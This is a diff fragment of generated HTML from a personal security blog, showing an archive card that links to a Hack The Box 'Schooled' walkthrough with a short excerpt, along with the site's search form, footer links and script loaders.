+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/ksBoJIQ.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      <!-- CUSTOM: Use localized link to posts in archive page -->
+      
+
+      
+        <a href="/en-US/walkthrough/2021/09/htb-schooled" rel="permalink">Walktrough: HTB Schooled
+</a>
+      
+
+      
+      <!-- END CUSTOM: Use localized link to posts in archive page-->
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2021-09-11T00:00:00-03:00">September 11, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          11 minute read
+        
+      </span>
+    
+
+    <!-- CUSTOM: Post Meta attributes and links -->
+    <span class="page__meta-sep page__meta-lang"></span>
+    
+    
+    
+    <span class="page__meta-lang"><a href="/walkthrough/2021/10/htb-dynstr">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
+    
+
+    
+
+    
+
+    
+    
+    
+    
+    
+  <span class="page__meta-sep page__meta-share"></span>
+  <span class="page__meta-share">
+    <i class="fas fa-share-alt" aria-hidden="true"></i>
+    <a href="#sharelinks">Share</a>
+  </span>
+    <!-- END CUSTOM: Post Meta attributes and links -->
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hello guys!
+
+This week’s machine will be Schooled, another medium-rated Linux box from Hack The Box, created by TheCyberGeek.
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap">
+<form class="search-content__form" onkeydown="return event.key != 'Enter';" role="search">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term...">
+  </form>
+  <div id="results" class="results"></div>
+</div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- Mermaid.js -->
+<script type="module">
+    import mermaid from 'https://unpkg.com/mermaid@9/dist/mermaid.esm.min.mjs';
+    const config = {
+        "theme": "dark", 
+        "startOnLoad": true
+    };
+    mermaid.initialize(config);
+</script>
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+          <li><a href="https://www.linkedin.com/in/davicruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> Linkedin</a></li>
+        
+      
+        
+          <li><a href="https://twitter.com/zerahzurc" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+        
+      
+        
+          <li><a href="https://github.com/davi-cruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+        
+      
+    
+    <!-- start custom: Fix Atom Feed, add Privacy, Consent and Read in other languages -->
+    
+      <li><a href="/en-US/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+    <li><a href="https://davicruz.com/en-US/terms-and-privacy/" rel="nofollow noopener noreferrer"><i class="fas fa-user-shield" aria-hidden="true"></i> Terms of Service and Privacy Policy</a></li>
+    <!--<li><a onclick="return klaro.show();"><i class="fas fa-shield-alt" aria-hidden="true"></i> Review consent</a></li>-->
+    
+      
+        
+          <li><a href="/">Disponível também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></li>
+        
+        
+        
+      
+    
+      
+    
+    <!-- end custom: Fix Atom Feed, add Privacy, Consent and Read in other languages -->
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2023 Davi Cruz. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a> &amp; <a href="https://github.com/kurtsson/jekyll-multiple-languages-plugin" rel="nofollow">Multiple Languages Plugin</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+  <!-- start custom analytics snippet -->
+
+<!-- end custom analytics snippet -->
+
+
+
+
+
+    <script>
+  'use strict';
+
+  (function() {
+    var commentContainer = document.querySelector('#utterances-comments');
+
+    if (!commentContainer) {
+      return;
+    }
+
+    var script = document.createElement('script');
+    script.setAttribute('src', 'https://utteranc.es/client.js');
+    script.setAttribute('repo', 'davi-cruz/davi-cruz-blog');
+    // CUSTOM : Utterances post mapping due to Jekyll Multilanguage
+    script.setAttribute('issue-term', 'htb-dynstr');
+    
+    script.setAttribute('theme', 'github-dark');
+    script.setAttribute('crossorigin', 'anonymous');
+
+    commentContainer.appendChild(script);
+  })();
+</script>
+
+  
+
+
+
+
+
+  </body>
+</html>
